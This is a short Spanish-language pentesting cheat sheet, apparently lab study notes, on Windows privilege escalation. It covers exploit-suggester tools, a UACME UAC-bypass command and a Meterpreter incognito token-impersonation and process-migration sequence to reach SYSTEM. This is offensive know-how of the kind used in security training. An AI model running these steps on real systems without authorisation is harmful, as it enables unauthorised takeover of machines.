-------------------------------------
- tags: #windows #privilegeescalation #kernel #metasploit #meterpreter 
-------------------
-> systeminfo
-> 


### Módulo de Metasploit para búsqueda de vulnerabilidades
	use post/multi/recon/local_exploit_suggester
(Hay que especificar la sesión)

### (Windows Exploit Suggester) GitHub para buscar vulnerabilidades

[Link al repositorio de GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)


### UAC bypass (si estamos en el grupo de administradores)
https://github.com/hfiref0x/UACME

##### Uso:
	akagi64.exe 23 C:\Temp\exploit.exe
	migrate x  (Siendo x el PID de un proceso ejecutado por NT AUTHORITY\SYSTEM)


### SeImpersonatePrivilege
	whoami /priv

Teniendo una sesión meterpreter ->

	get_privs
	load incognito
	list_tokens -u
	impersonate_token "ATTACKDEFENSE\Administrator"
	pgrep explorer
	migrate x (Siendo x el PID de explorer)


(Puede que tengamos que repetir esto para llegar a ser NT AUTHORITY\SYSTEM)

![[Pasted image 20230730135839.png]]
![[Pasted image 20230730140203.png]]












